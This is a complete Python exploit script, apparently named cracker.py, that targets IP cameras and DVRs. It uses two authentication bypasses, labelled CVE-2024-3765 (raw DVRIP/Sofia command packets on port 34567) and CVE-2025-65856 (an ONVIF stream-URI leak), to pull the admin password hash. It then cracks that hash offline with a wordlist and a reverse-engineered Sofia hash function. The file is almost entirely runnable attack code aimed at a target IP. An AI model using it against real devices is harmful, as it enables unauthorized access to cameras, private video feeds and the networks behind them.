#!/usr/bin/env python3

import os
import re
import sys
import json
import socks  # PySocks
import socket
import hashlib
from onvif import ONVIFCamera

commands = [
    'ff00000000000000000000000000f103250000007b202252657422203a203130302c202253657373696f6e494422203a202230783022207d0aff00000000000000000000000000ac05300000007b20224e616d6522203a20224f5054696d655175657279222c202253657373696f6e494422203a202230783022207d0a',  # Initial command
    'ff00000000000000000000000000ee032e0000007b20224e616d6522203a20224b656570416c697665222c202253657373696f6e494422203a202230783022207d0a',  # KeepAlive
    'ff00000000000000000000000000c00500000000',  # Users Information
]

def deps():
    try:
        wordlist = sys.argv[1]
        if re.match(r'^(((?!25?[6-9])[12]\d|[1-9])?\d\.?\b){4}$', wordlist):
            print("[+] First argument - path to wordlist")
            print("[+] Usage: python3 cracker.py </path/to/wordlist> <ip> [port]")
            sys.exit(1)
        ip = sys.argv[2]
        if re.match(r'^(((?!25?[6-9])[12]\d|[1-9])?\d\.?\b){4}$', ip) == None:
            print("[+] Second argument - IP address")
            print("[+] Usage: python3 cracker.py </path/to/wordlist> <ip> [port]")
            sys.exit(1)
    except IndexError:
        print("[+] Usage: python3 cracker.py </path/to/wordlist> <ip> [onvif_port] [sofia_port]")
        sys.exit(1)

    try:
        onvif_port = sys.argv[3]
    except IndexError:
        onvif_port = 8899

    try:
        sofia_port = sys.argv[4]
    except IndexError:
        sofia_port = 34567

    print(f"[+] IP: {ip}")
    print(f"[+] ONVIF port: {onvif_port}")
    print(f"[+] DVRIP/Sofia port: {sofia_port}")
    print(f"[+] Wordlist: {os.path.basename(wordlist)}")

    return wordlist, ip, onvif_port, sofia_port

def camera_setup(ip, sofia_port):
    """Setup ONVIF connection to camera"""
    try:
        cam = ONVIFCamera(ip, sofia_port, 'admin', '')
        print(f"[+] ONVIF connection established")
    except Exception as e:
        cam = ''
        print(f"[-] Connection to ONVIF failed: {e}")
        sys.exit(1)

    return cam

def send_data(s, data):
    binary_data = bytes.fromhex(data)
    s.sendall(binary_data)

def recv_all(s):
    s.settimeout(10.0)
    data = b''
    while True:
        try:
            part = s.recv(1024)
            data += part
            if part.endswith(b'\x0a\x00'):
                break
        except socket.timeout:
            print("[-] Socket timeout. Aborting...")
            break
    return data

def process_commands(socket, commands):
    for command in commands:
        send_data(socket, command)
        response = recv_all(socket)
        if command ==  'ff00000000000000000000000000c00500000000':
            json_response = response[20:-2].decode('utf8')
            json_data = json.loads(json_response)
            return json_data["Users"][0]["Password"]
    return ''

def cve_2024_3765(ip, sofia_port):
    """Get password hash via vulnerable DVRIP/Sofia command code"""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(10)
        s.connect((ip, sofia_port))
        hash_string = process_commands(s, commands)
        print(f"[+] Password hash found: {hash_string}")
    return hash_string

def cve_2025_65856(ip, onvif_port):
    """Get password hash via ONVIF calls"""
    cam = camera_setup(ip, onvif_port)

    try:
        media = cam.create_media_service()
        print("[+] Media service created successfully")
    except Exception as e:
        print(f"[-] Failed to create media service: {e}")
        sys.exit(1)

    profiles = media.GetProfiles()

    try:
        # Create stream setup request
        stream_setup = {
            'Stream': 'RTP-Unicast',  # RTP-Unicast, RTP-Multicast
            'Transport': {
                'Protocol': 'RTSP'  # RTSP, UDP, HTTP
            }
        }

        # Get Stream URI
        stream_uri_response = media.GetStreamUri({
            'StreamSetup': stream_setup,
            'ProfileToken': profiles[0].token
        })

        hash_string = stream_uri_response.Uri.split("=")[2][:8]
        print(f"[+] Found Sofia hash: {hash_string}")
    except Exception as e:
        hash_string = ''
        print(f"[-] Failed to get Sofia hash: {e}")
    return hash_string

def get_password_hash(ip, onvif_port, sofia_port):
    try:
        print("[+] Trying DVRIP/Sofia authentication bypass...")
        hash_string = cve_2024_3765(ip, sofia_port)
    except Exception as e:
        print(f"[-] Sofia authentication bypass failed: {e}")
        print("[+] Trying ONVIF authentication bypass...")
        try:
            hash_string = cve_2025_65856(ip, onvif_port)
        except Exception as e:
            print(f"[-] ONVIF authentication bypass failed. Aborting... {e}")
            sys.exit(1)
    return hash_string

def sofia_hash(msg):
    """Reverse engineered implementation of Sofia hash algorithm"""
    # Convert text to bytes (MD5 works on bytes)
    if isinstance(msg, str):
        msg = msg.encode("utf-8")

    h = ""
    m = hashlib.md5()
    m.update(msg)
    msg_md5 = m.digest()  # bytes, length 16

    for i in range(8):
        n = (msg_md5[2 * i] + msg_md5[2 * i + 1]) % 0x3E # 0x3E = 62 (hex -> dec)
        if n > 9:
            if n > 35:
                n += 61
            else:
                n += 55
        else:
            n += 0x30 #0x30 = 48 (hex -> dec)
        h += chr(n)

    return h

def crack(wordlist, hash_string):
    """Crack password"""
    c = 0
    found = 0
    encoding = 'latin-1' if re.match('rockyou', os.path.basename(wordlist)) else 'utf-8'
    with open(wordlist, "rb") as f:
        total_lines = sum(1 for _ in f)
    with open(wordlist, 'r', encoding=encoding) as file:
        for line in file:
            c += 1
            print(f'[+] {c}/{total_lines} [{c / total_lines * 100:.2f}%]', end='\r', flush=True)
            line = line.strip()
            if sofia_hash(line) == hash_string:
                #print(f'[+] {c}/{total_lines} [{c / total_lines * 100:.2f}%]', end='\n', flush=True)
                print(f"[+] Hash: {sofia_hash(line)}, Password: {line}")
                found = 1
                break

        if found == 0: print("[+] Password not found")

def main():
    wordlist, ip, onvif_port, sofia_port = deps()
    hash_string = get_password_hash(ip, onvif_port, sofia_port)
    crack(wordlist, hash_string)

if __name__ == "__main__":
    main()
